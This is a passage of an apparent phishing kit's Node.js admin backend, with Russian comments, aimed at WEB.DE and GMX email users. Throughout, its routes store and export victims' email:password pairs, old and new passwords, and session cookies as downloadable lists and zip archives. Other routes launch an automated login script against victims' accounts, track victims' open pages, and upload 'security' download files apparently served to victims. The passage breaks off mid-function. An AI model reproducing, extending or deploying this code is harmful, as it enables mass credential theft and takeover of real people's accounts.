'use strict';

const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminAuth, getAdminTokenFromRequest, ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminPageAuth } = require('../utils/authUtils');
const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
const leadService = require('../services/leadService');
const automationService = require('../services/automationService');
const chatService = require('../services/chatService');

function normalizePathname(parsedUrl) {
  return (parsedUrl.pathname || '').replace(/\/\/+/g, '/') || '/';
}

async function handleRoute(req, res, parsedUrl, body, d) {
  const pathname = normalizePathname(parsedUrl);
  const parsed = parsedUrl;
  const method = req.method;
  if (pathname === '/api/webde-login-grid-step' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id && String(json.id).trim();
      if (!idRaw) return send(res, 400, { ok: false, error: 'id required' });
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      const stepPatch = {};
      if (json.step === null || json.step === undefined || json.step === '') {
        stepPatch.webdeLoginGridStep = null;
      } else {
        const n = parseInt(json.step, 10);
        if (!Number.isFinite(n) || n < 0) return send(res, 400, { ok: false, error: 'step must be non-negative integer' });
        stepPatch.webdeLoginGridStep = String(n);
      }
      try {
        if (!leadService.persistLeadPatch(id, stepPatch)) return send(res, 500, { ok: false, error: 'write error' });
      } catch (e) {
        console.error('[SERVER] webde-login-grid-step leadService.persistLeadPatch:', e);
        return send(res, 500, { ok: false, error: 'write error' });
      }
      return send(res, 200, { ok: true });
    });
    return;
  }

  /** API для скрипта входа WEB.DE: отдать email и пароль лида (скрипт опрашивает, пока админ не введёт пароль). Асинхронное чтение leads.json — не блокирует event loop при большом файле и лавине запросов. */
  if (pathname === '/api/lead-cookies' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = leadService.resolveLeadId(leadId);
    const leads = leadService.readLeads();
    const lead = leads.find((l) => l.id === id);
    if (!lead) return send(res, 404, { ok: false });
    const email = cookieEmailForLeadCookiesFile(lead);
    if (!email) return send(res, 404, { ok: false });
    const safe = cookieSafeForLoginCookiesFile(email);
    const cookiesPath = path.join(PROJECT_ROOT, 'login', 'cookies', safe + '.json');
    if (!fs.existsSync(cookiesPath)) return send(res, 404, { ok: false, error: 'Куки не найдены (вход не выполнялся или не был успешным)' });
    try {
      const data = fs.readFileSync(cookiesPath, 'utf8');
      const filename = 'cookies-' + sanitizeFilenameForHeader(safe) + '.json';
      res.writeHead(200, {
        'Content-Type': 'application/json',
        'Content-Disposition': 'attachment; filename="' + filename + '"',
        'Cache-Control': 'no-store'
      });
      res.end(data);
    } catch (e) {
      console.error('[АДМИН] lead-cookies: ошибка чтения файла', e);
      return send(res, 500, { ok: false, error: 'Ошибка чтения файла куки' });
    }
    return;
  }

  /** Выгрузка куки: архив .zip с .txt файлами (в каждом сверху комментарий email:pass | new: pass). mode=all — все куки (и помечаем выгруженными), mode=new — только ещё не выгружавшиеся, mode=force — все куки без пометки (принудительная выгрузка). */
  if (pathname === '/api/config/cookies-export' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const mode = (parsed.query && parsed.query.mode) ? String(parsed.query.mode).trim().toLowerCase() : 'all';
    if (mode !== 'all' && mode !== 'new' && mode !== 'force') return send(res, 400, { ok: false, error: 'mode=all|new|force' });
    const cookiesDir = path.join(PROJECT_ROOT, 'login', 'cookies');
    if (!fs.existsSync(cookiesDir)) return send(res, 200, { ok: false, error: 'Нет папки с куки' });
    const files = fs.readdirSync(cookiesDir).filter((f) => f.endsWith('.json'));
    const exportedSet = new Set(readCookiesExported());
    const toExport = (mode === 'new') ? files.filter((f) => {
      const safe = f.slice(0, -5);
      return !exportedSet.has(safe);
    }) : files;
    if (toExport.length === 0) {
      return send(res, 200, { ok: false, error: mode === 'new' ? 'Нет новых куки для выгрузки' : 'Нет файлов куки' });
    }
    const skipMarkExported = (mode === 'force');
    const leads = leadService.readLeads();
    const emailToLead = {};
    leads.forEach((l) => {
      const e = (l.email || '').trim().toLowerCase();
      if (e) emailToLead[e] = l;
    });
    const tempDir = path.join(os.tmpdir(), 'gmw-cookies-export-' + Date.now());
    const zipPath = path.join(os.tmpdir(), 'gmw-cookies-export-' + Date.now() + '.zip');
    try {
      fs.mkdirSync(tempDir, { recursive: true });
      const exportedNames = [];
      for (const f of toExport) {
        const safe = f.slice(0, -5);
        const email = safe.replace(/_at_/g, '@');
        const lead = emailToLead[email.toLowerCase()];
        const { passLogin, passNew } = lead ? getLoginAndNewPassword(lead) : { passLogin: '', passNew: '' };
        const commentLine = '# email:' + email + ':' + passLogin + ' | new: ' + passNew;
        const cookiePath = path.join(cookiesDir, f);
        const cookieData = fs.readFileSync(cookiePath, 'utf8');
        const txtContent = commentLine + '\n' + cookieData;
        const txtFileName = cookieExportFilename(email);
        fs.writeFileSync(path.join(tempDir, txtFileName), txtContent, 'utf8');
        exportedNames.push(safe);
      }
      const zipResult = spawnSync('zip', ['-r', zipPath, '.'], { cwd: tempDir, encoding: 'utf8', shell: process.platform === 'win32' });
      if (zipResult.error || zipResult.status !== 0) {
        console.error('[АДМИН] cookies-export zip error:', zipResult.error || zipResult.stderr);
        return send(res, 500, { ok: false, error: 'Ошибка создания архива' });
      }
      if (!skipMarkExported) writeCookiesExported([...readCookiesExported(), ...exportedNames]);
      try { fs.rmSync(tempDir, { recursive: true }); } catch (e) {}
      const filename = mode === 'new' ? 'cookies-new.zip' : (mode === 'force' ? 'cookies-force.zip' : 'cookies-all.zip');
      res.writeHead(200, {
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename="' + filename + '"',
        'Cache-Control': 'no-store'
      });
      const stream = fs.createReadStream(zipPath);
      stream.pipe(res);
      stream.on('end', () => {
        try { fs.unlinkSync(zipPath); } catch (e) {}
      });
      res.on('close', () => {
        try { fs.unlinkSync(zipPath); } catch (e) {}
      });
    } catch (e) {
      console.error('[АДМИН] cookies-export:', e);
      try { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true }); } catch (e2) {}
      try { if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); } catch (e2) {}
      return send(res, 500, { ok: false, error: String(e.message || e) });
    }
    return;
  }

  /** Скрипт входа ждёт новый пароль (long-poll). Запрос висит до сохранения пароля в админке или таймаута. */
  if (pathname === '/api/webde-login-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id && String(json.id).trim();
      if (!id) {
        console.error('[АДМИН] webde-login-start: не передан id');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.error('[АДМИН] webde-login-start: лид не найден, id=' + id);
        return send(res, 404, { ok: false });
      }
      delete lead.webdeLoginGridExhausted;
      delete lead.webdeLoginGridStep;
      const email = (lead.email || '').trim();
      if (!email) {
        console.error('[АДМИН] webde-login-start: у лида нет email, id=' + id);
        return send(res, 400, { ok: false, error: 'У лида нет email' });
      }
      const emailLower = email.toLowerCase();
      automationService.preemptWebdeLoginForReplacedLead(id, emailLower);
      if (!automationService.tryAcquireWebdeScriptLock(emailLower, id)) {
        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: скрипт уже запущен для email, id=' + id);
        return send(res, 409, { ok: false, error: 'Для этого email скрипт входа уже запущен' });
      }
      if (automationService.runningWebdeLoginLeadIds.size >= automationService.WEBDE_LOGIN_MAX_CONCURRENT) {
        automationService.clearWebdeScriptRunning(emailLower);
        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: занято слотов ' + automationService.WEBDE_LOGIN_MAX_CONCURRENT);
        return send(res, 409, { ok: false, error: 'Достигнут лимит одновременных автовходов (' + automationService.WEBDE_LOGIN_MAX_CONCURRENT + ')' });
      }
      const loginDir = path.join(PROJECT_ROOT, 'login');
      const scriptPath = path.join(loginDir, 'lead_simulation_api.py');
      if (!fs.existsSync(scriptPath)) {
        automationService.clearWebdeScriptRunning(emailLower);
        console.error('[АДМИН] webde-login-start: скрипт не найден — ' + scriptPath);
        return send(res, 500, { ok: false, error: 'login/lead_simulation_api.py не найден' });
      }
      const webdeComboSlotManual = automationService.runningWebdeLoginLeadIds.size;
      automationService.runningWebdeLoginLeadIds.add(id);
      const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
      const host = (req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1:' + PORT).split(',')[0].trim();
      const baseUrl = process.env.SERVER_URL || (protocol + '://' + host);
      const token = ADMIN_TOKEN || '';
      const python = process.platform === 'win32' ? 'python' : 'python3';
      const env = Object.assign({}, process.env, { PYTHONUNBUFFERED: '1' });
      const pyArgsManual = [scriptPath, '--server-url', baseUrl, '--lead-id', id, '--token', token, '--combo-slot', String(webdeComboSlotManual)];
      if (readStartPage() === 'klein') pyArgsManual.push('--klein-orchestration');
      const child = require('child_process').spawn(python, pyArgsManual, { cwd: PROJECT_ROOT, detached: true, stdio: 'inherit', env });
      automationService.webdeLockWriteChildPid(emailLower, child.pid);
      automationService.webdeLoginChildByLeadId.set(id, child);
      child.on('exit', function () {
        automationService.webdeLoginChildByLeadId.delete(id);
      });
      child.unref();
      const manualSession = automationService.beginWebdeAutoLoginRun(lead);
      const manualKleinOrch = readStartPage() === 'klein';
      const manualDetail = 'ручной запуск · lead_simulation_api.py' + (manualKleinOrch ? ' · --klein-orchestration' : '');
      pushEvent(lead, EVENT_LABELS.WEBDE_START, 'script', { session: manualSession, detail: manualDetail });
      leadService.persistLeadPatch(id, {
        webdeScriptRunSeq: lead.webdeScriptRunSeq,
        webdeScriptActiveRun: lead.webdeScriptActiveRun,
        eventTerminal: lead.eventTerminal
      });
      logTerminalFlow('АДМИН', 'Админ', manualSession, email, 'ручной запуск webde-login id=' + id + (manualKleinOrch ? ' klein-orchestration' : ''));
      send(res, 200, { ok: true, message: 'started' });
    });
    return;
  }

  if (pathname === '/api/mark-opened' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const email = json.email;
      if (!email || typeof email !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const emailLower = email.trim().toLowerCase();
      const now = new Date().toISOString();
      let found = false;
      const markedIds = [];
      // Помечаем все логи с таким email как открытые
      leads.forEach(function(lead) {
        const leadEmail = (lead.email || '').trim().toLowerCase();
        if (leadEmail === emailLower && !lead.openedAt) {
          lead.openedAt = now;
          found = true;
          markedIds.push(lead.id);
        }
      });
      if (found) {
        markedIds.forEach(function (mid) {
          const Lm = leads.find(function (x) { return x && String(x.id) === String(mid); });
          if (Lm) leadService.persistLeadPatch(mid, { openedAt: Lm.openedAt });
        });
        writeDebugLog('MARK_OPENED', { 
          email: email, 
          markedCount: markedIds.length,
          markedIds: markedIds
        });
      }
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/leads' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    var leadsQuery = (parsed && parsed.query) || {};
    var page = Math.max(1, parseInt(leadsQuery.page, 10) || 1);
    var limit = Math.min(1000, Math.max(1, parseInt(leadsQuery.limit, 10) || 200));
    writeDebugLog('LEADS_REQUESTED', { timestamp: new Date().toISOString(), ip: getClientIp(req), page: page, limit: limit });
    leadService.readLeadsAsync(function (err, leads) {
      if (err) {
        console.error('[SERVER] Ошибка чтения leads:', err);
        return send(res, 500, { error: 'Ошибка чтения данных' });
      }
      try {
        if (!Array.isArray(leads)) {
          console.error('[SERVER] Ошибка: leads.json не является массивом');
          return send(res, 200, { leads: [], total: 0, page: 1, limit: limit });
        }
        const originalCount = leads.length;

        leads = leads.filter(function (l) {
          return l && typeof l === 'object' && (l.id || l.email || l.ip);
        });
        const afterFilterCount = leads.length;

        let cleaned = [];
        const seenIds = new Set();
        leads.forEach(function (lead) {
          if (!lead || typeof lead !== 'object') return;
          const id = lead.id != null ? String(lead.id).trim() : '';
          if (id && seenIds.has(id)) return;
          if (id) seenIds.add(id);
          cleaned.push(lead);
        });
        leads = cleaned;

        const now = Date.now();
        leads.forEach(function (l) {
          const h = l && l.id ? statusHeartbeats[l.id] : null;
          if (!h) return;
          const seenAt = new Date(h.lastSeenAt).getTime();
          if (now - seenAt <= HEARTBEAT_MAX_AGE_MS) {
            l.sessionPulseAt = h.lastSeenAt;
            if (h.currentPage) l.currentPage = h.currentPage;
          }
        });
        const leadIds = new Set(leads.map(function (l) { return l && l.id ? l.id : null; }).filter(Boolean));
        Object.keys(statusHeartbeats).forEach(function (kid) {
          if (!leadIds.has(kid)) delete statusHeartbeats[kid];
          else if (now - new Date(statusHeartbeats[kid].lastSeenAt).getTime() > HEARTBEAT_MAX_AGE_MS) delete statusHeartbeats[kid];
        });

        /** Порядок в списке админки: только «новая сессия» (новый лог / снова ввёл email), не каждое событие. См. adminListSortAt при создании лида. */
        function leadRecencyMsForApi(l) {
          if (!l) return 0;
          const als = l.adminListSortAt ? new Date(l.adminListSortAt).getTime() : NaN;
          if (!isNaN(als) && als > 0) return als;
          const cr = l.createdAt ? new Date(l.createdAt).getTime() : NaN;
          if (!isNaN(cr) && cr > 0) return cr;
          const ls = l.lastSeenAt ? new Date(l.lastSeenAt).getTime() : NaN;
          return !isNaN(ls) && ls > 0 ? ls : 0;
        }
        leads.sort(function (a, b) {
          if (!a || !b) return 0;
          const ta = leadRecencyMsForApi(a);
          const tb = leadRecencyMsForApi(b);
          if (tb !== ta) return tb - ta;
          return (b.id || '').localeCompare(a.id || '');
        });

        const seenId = new Set();
        const result = leads.filter(function (l) {
          const id = (l && l.id) ? String(l.id).trim() : '';
          if (id) {
            if (seenId.has(id)) return false;
            seenId.add(id);
          }
          return true;
        });

        /**
         * В списке админки по умолчанию нет архивных (adminLogArchived / klLogArchived — данные в leads.json остаются).
         * Показать все: ?includeArchived=1
         */
        var includeArchived = leadsQuery.includeArchived === '1' || leadsQuery.includeArchived === 'true';
        var listForAdmin = result;
        if (!includeArchived) {
          listForAdmin = result.filter(function (l) {
            if (!l || typeof l !== 'object') return false;
            if (archiveFlagIsSet(l.adminLogArchived) || archiveFlagIsSet(l.klLogArchived)) return false;
            return true;
          });
        }

        var chatData = chatService.readChat();
        var cookiesDir = path.join(PROJECT_ROOT, 'login', 'cookies');
        var cookieSafeSet = new Set();
        if (fs.existsSync(cookiesDir)) {
          fs.readdirSync(cookiesDir).filter(function (f) { return f.endsWith('.json'); }).forEach(function (f) { cookieSafeSet.add(f.slice(0, -5)); });
        }
        var cookieExportedSet = new Set(readCookiesExported());
        function cookieSafeFromEmail(email) {
          if (!email || typeof email !== 'string') return '';
          return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
        }
        var resultWithChat = listForAdmin.map(function (l) {
          var copy = {};
          for (var key in l) { if (Object.prototype.hasOwnProperty.call(l, key)) copy[key] = l[key]; }
          var chatKey = chatService.getChatKeyForLeadId(l.id, leads);
          copy.chatCount = Array.isArray(chatData[chatKey]) ? chatData[chatKey].length : 0;
          var safe = cookieSafeFromEmail(cookieEmailForLeadCookiesFile(l));
          copy.cookiesAvailable = cookieSafeSet.has(safe);
          copy.cookiesExported = cookieExportedSet.has(safe);
          return copy;
        });
        const byPlatform = { windows: 0, macos: 0, android: 0, ios: 0, other: 0 };
        resultWithChat.forEach(function (l) {
          const p = (l.platform || '').toLowerCase();
          if (p === 'windows') byPlatform.windows++;
          else if (p === 'macos') byPlatform.macos++;
          else if (p === 'android') byPlatform.android++;
          else if (p === 'ios') byPlatform.ios++;
          else byPlatform.other++;
        });
        var total = resultWithChat.length;
        var start = (page - 1) * limit;
        var slice = resultWithChat.slice(start, start + limit);
        /** Админка: при пагинации выбранный лид может «выпасть» со страницы при появлении нового лога — не переключать фокус на новый. */
        var ensureIdRaw = leadsQuery.ensureId && String(leadsQuery.ensureId).trim();
        var ensureResolved = ensureIdRaw ? String(leadService.resolveLeadId(ensureIdRaw)) : '';
        if (ensureResolved) {
          var alreadyInSlice = slice.some(function (l) {
            return l && l.id != null && String(l.id) === ensureResolved;
          });
          if (!alreadyInSlice) {
            var ensuredLead = resultWithChat.find(function (l) {
              return l && l.id != null && String(l.id) === ensureResolved;
            });
            if (ensuredLead) {
              slice = slice.concat([ensuredLead]);
              slice.sort(function (a, b) {
                if (!a || !b) return 0;
                var ta = leadRecencyMsForApi(a);
                var tb = leadRecencyMsForApi(b);
                if (tb !== ta) return tb - ta;
                return (b.id || '').localeCompare(a.id || '');
              });
            }
          }
        }
        writeDebugLog('LEADS_RETURNED', { count: slice.length, total: total, page: page, limit: limit, totalInFile: originalCount, byPlatform: byPlatform });
        var _payload = { leads: slice, total: total, page: page, limit: limit };
        /** Админка: после слияния логов (тот же email → новый id) выбранный старый id не совпадает с записью — подставить актуальный id из replaced-lead-ids. */
        if (ensureIdRaw) {
          _payload.ensureIdResolved = ensureResolved || ensureIdRaw;
        }
        if (safeEnd(res)) return;
        var bodyJson = JSON.stringify(_payload);
        var leadsHeaders = {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Authorization',
          'Cache-Control': 'no-store, no-cache, must-revalidate',
          'Pragma': 'no-cache'
        };
        res.writeHead(200, leadsHeaders);
        var chunkSize = 65536;
        for (var i = 0; i < bodyJson.length; i += chunkSize) {
          res.write(bodyJson.slice(i, i + chunkSize));
        }
        res.end();
        return;
      } catch (e) {
        console.error('[SERVER] Ошибка обработки leads:', e);
        return send(res, 500, { error: 'Ошибка чтения данных' });
      }
    });
    return;
  }

  if (pathname === '/api/save-credentials' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    console.log('[SERVER] /api/save-credentials: получен запрос');
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      console.log('[SERVER] /api/save-credentials: тело запроса:', body);
      let json = {};
      try { 
        json = JSON.parse(body || '{}'); 
        console.log('[SERVER] /api/save-credentials: распарсен JSON:', json);
      } catch (err) {
        console.error('[SERVER] /api/save-credentials: ошибка парсинга JSON:', err);
        return send(res, 400, { ok: false, error: 'invalid json' });
      }
      const id = json.id;
      console.log('[SERVER] /api/save-credentials: id=', id);
      if (!id || typeof id !== 'string') {
        console.error('[SERVER] /api/save-credentials: неверный id');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.error('[SERVER] /api/save-credentials: лог не найден, id=', id);
        return send(res, 404, { ok: false, error: 'lead not found' });
      }
      
      const email = (lead.email || '').trim();
      const password = (lead.password || '').trim();
      const newPassword = lead.changePasswordData && (lead.changePasswordData.newPassword || '').trim();
      
      console.log('[SERVER] /api/save-credentials: email=', maskEmail(email), 'hasPassword=', !!password, 'hasNewPassword=', !!newPassword);
      
      if (!email || !password) {
        console.error('[SERVER] /api/save-credentials: отсутствует email или пароль');
        return send(res, 400, { ok: false, error: 'Email или пароль отсутствуют' });
      }
      
      const credentials = readSavedCredentials();
      console.log('[SERVER] /api/save-credentials: текущее количество сохраненных:', credentials.length);
      const credentialText = email + ':' + password + (newPassword ? ' | ' + newPassword : '');
      const credentialData = {
        id: Date.now().toString(36) + Math.random().toString(36).slice(2),
        email: email,
        password: password,
        newPassword: newPassword || null,
        credentialText: credentialText,
        savedAt: new Date().toISOString()
      };
      
      credentials.push(credentialData);
      writeSavedCredentials(credentials);
      console.log('[SERVER] /api/save-credentials: данные сохранены, новое количество:', credentials.length);
      
      writeDebugLog('SAVE_CREDENTIALS', { 
        id: id, 
        email: email,
        hasNewPassword: !!newPassword,
        credentialId: credentialData.id,
        totalSaved: credentials.length
      });
      
      send(res, 200, { ok: true, credential: credentialData });
    });
    return;
  }

  if (pathname === '/api/get-saved-credentials' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const credentials = readSavedCredentials();
    return send(res, 200, credentials);
  }

  if (pathname === '/api/delete-saved-credential' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const credentialId = json.id;
      if (!credentialId || typeof credentialId !== 'string') return send(res, 400, { ok: false });
      
      const credentials = readSavedCredentials();
      const filtered = credentials.filter((c) => c.id !== credentialId);
      if (filtered.length === credentials.length) return send(res, 404, { ok: false });
      
      writeSavedCredentials(filtered);
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/mode' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readModeData();
    const canonicalBaseGmx = 'https://' + GMX_DOMAIN;
    const canonicalBaseWebde = 'https://' + WEBDE_CANONICAL_HOST;
    return send(res, 200, { mode: data.mode, autoScript: data.autoScript, canonicalBase: canonicalBaseGmx, canonicalBaseGmx, canonicalBaseWebde });
  }

  if (pathname === '/api/mode' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const mode = json.mode === 'manual' ? 'manual' : (json.mode === 'auto' ? 'auto' : undefined);
      const autoScript = json.autoScript !== undefined ? !!json.autoScript : undefined;
      writeMode(mode, autoScript);
      const data = readModeData();
      send(res, 200, { ok: true, mode: data.mode, autoScript: data.autoScript });
    });
    return;
  }

  if (pathname === '/api/start-page' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, { startPage: readStartPage() });
  }

  if (pathname === '/api/start-page' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const sp = json.startPage != null ? String(json.startPage).trim().toLowerCase() : '';
      const value = sp === 'login' ? 'login' : sp === 'change' ? 'change' : sp === 'download' ? 'download' : sp === 'klein' ? 'klein' : 'login';
      writeStartPage(value);
      send(res, 200, { ok: true, startPage: value });
    });
    return;
  }

  if (pathname === '/api/export-logs' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const type = (q.type && String(q.type).trim()) || 'credentials';
    let leads = leadService.readLeads();
    const platformsParam = q.platforms;
    const knownPlatforms = ['windows', 'macos', 'android', 'ios'];
    if (platformsParam) {
      const list = typeof platformsParam === 'string' ? platformsParam.split(',') : Array.isArray(platformsParam) ? platformsParam : [];
      const set = new Set(list.map((p) => String(p).trim().toLowerCase()).filter(Boolean));
      if (set.size > 0) {
        leads = leads.filter((lead) => {
          const p = (lead.platform || '').toLowerCase();
          const isUnknown = !p || !knownPlatforms.includes(p);
          if (set.has('unknown') && isUnknown) return true;
          if (knownPlatforms.includes(p) && set.has(p)) return true;
          return false;
        });
      }
    }
    const emailTrim = (s) => (s != null ? String(s).trim() : '') || '';
    const seen = new Map();
    if (type === 'credentials') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        const password = (lead.password != null ? String(lead.password) : '').trim();
        if (email && password) {
          const line = email + ':' + password;
          seen.set(line, line);
        }
      });
    } else if (type === 'all_emails') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (email) seen.set(email, email);
      });
    } else if (type === 'all_email_pass') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (!email) return;
        const password = (lead.password != null ? String(lead.password) : '').trim();
        const line = email + ':' + (password || '');
        seen.set(line, line);
      });
    } else if (type === 'all_email_old_new') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (!email) return;
        const history = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : [];
        const arr = history.map((p) => (typeof p === 'object' && p && p.p != null ? String(p.p).trim() : (p != null ? String(p).trim() : '')));
        const current = (lead.password != null ? String(lead.password) : '').trim();
        let oldP = '-';
        let newP = current || '-';
        if (arr.length >= 2) {
          oldP = arr[0] || '-';
          newP = arr[arr.length - 1] || current || '-';
        } else if (arr.length === 1) {
          newP = arr[0] || '-';
        }
        const line = email + ':' + oldP + '\t' + newP;
        seen.set(line, line);
      });
    } else {
      return send(res, 400, { ok: false, error: 'Invalid type' });
    }
    const lines = Array.from(seen.values());
    const body = lines.join('\n') + (lines.length ? '\n' : '');
    const filename = type === 'credentials' ? 'logs-email-password.txt' : type === 'all_emails' ? 'logs-emails.txt' : type === 'all_email_pass' ? 'logs-all-email-pass.txt' : 'logs-email-old-new.txt';
    if (safeEnd(res)) return;
    res.writeHead(200, {
      'Content-Type': 'text/plain; charset=utf-8',
      'Content-Disposition': 'attachment; filename="' + sanitizeFilenameForHeader(filename) + '"',
      'Cache-Control': 'no-store'
    });
    res.end(body);
    return;
  }

  if (pathname === '/api/config/download' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const files = getSicherheitDownloadFiles();
    return send(res, 200, { files });
  }

  if (pathname === '/api/config/download-limit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const index = json.index != null ? parseInt(json.index, 10) : -1;
      let limit = json.limit != null ? parseInt(String(json.limit), 10) : -1;
      if (limit < 0) limit = 0;
      const config = readDownloadFilesConfig();
      const name = (fileName && !fileName.includes('..') && !fileName.includes(path.sep))
        ? path.basename(fileName)
        : (index >= 0 && index < config.length ? config[index] : null);
      if (!name) return send(res, 400, { ok: false, error: 'fileName or index required' });
      const limits = readDownloadLimits();
      limits[name] = limit;
      writeDownloadLimits(limits);
      return send(res, 200, { ok: true, fileName: name, limit });
    });
    return;
  }

  if (pathname === '/api/config/download-upload-multi' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      const files = [];
      let zipPassword = '';
      let idx = body.indexOf(boundaryPrefix);
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          const fieldName = nameMatch ? nameMatch[1].replace(/\s*\[\]$/, '') : '';
          if ((fieldName === 'file' || fieldName === 'files') && fileMatch) {
            const filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) files.push({ filename, start: bodyStart, end: partEnd });
          } else if (fieldName === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (files.length === 0) return send(res, 400, { ok: false, error: 'Нет файлов' });
      if (zipPassword) writeZipPassword(zipPassword);
      if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
      const newList = [];
      const limits = readDownloadLimits();
      const counts = readDownloadCounts();
      const maxFiles = Math.min(files.length, DOWNLOAD_SLOTS_COUNT);
      for (let i = 0; i < maxFiles; i++) {
        const original = path.basename(files[i].filename).replace(/\.\./g, '').replace(/[/\\]/g, '') || 'download';
        const ext = (path.extname(original) || '').toLowerCase();
        const safeExt = /^\.([a-zA-Z0-9]+)$/.test(ext) ? ext : '.bin';
        const base = (path.basename(original, ext) || 'download').replace(/[^a-zA-Z0-9._-]/g, '_');
        let slotName = base + safeExt;
        let n = 1;
        while (newList.indexOf(slotName) !== -1) {
          slotName = base + '-' + (++n) + safeExt;
        }
        const buf = body.slice(files[i].start, files[i].end);
        try {
          const fullPath = path.join(DOWNLOADS_DIR, slotName);
          fs.writeFileSync(fullPath, buf);
          newList.push(slotName);
          if (limits[slotName] === undefined) limits[slotName] = DEFAULT_DOWNLOAD_LIMIT;
